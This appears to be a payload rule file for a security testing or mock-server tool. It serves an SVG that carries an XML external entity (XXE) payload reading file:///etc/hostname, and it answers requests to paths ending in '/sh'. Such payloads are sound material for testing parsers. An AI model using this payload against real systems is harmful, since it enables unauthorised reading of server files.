---
title: XXE SVG Hostname
description: Returns an SVG payload with XXE to get files
weight: 1
pattern: /sh$
is_final: true
data:
  headers:
    Content-Type: text/xml
  body: |
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>



---


### /sh

attempts to get /etc/hostname

SVG with XXE payloads
